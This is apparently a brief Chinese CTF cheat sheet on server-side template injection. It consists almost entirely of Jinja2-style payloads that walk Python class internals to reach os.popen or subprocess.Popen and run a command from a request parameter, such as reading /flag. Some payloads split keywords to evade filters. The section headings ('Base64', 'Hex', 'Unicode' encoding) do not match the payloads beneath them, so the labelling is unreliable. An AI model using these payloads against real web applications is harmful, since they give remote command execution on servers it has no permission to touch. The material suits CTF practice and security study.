# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/SSTI.md
# TITLE: SSTI（服务器端模板注入）
# CATEGORY: web

# Base64编码
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['__im'+'port__']('o'+'s').__dict__['po'+'pen'](request.args.a).read()}}&a=Y2F0IC9mbGFn

# Hex编码
{{''.__class__.__mro__[2].__subclasses__()[258](request.args.a,shell=True,stdout=-1).communicate()}}&a=cat%20/flag

# Unicode编码
{{()|attr('__class__')}}
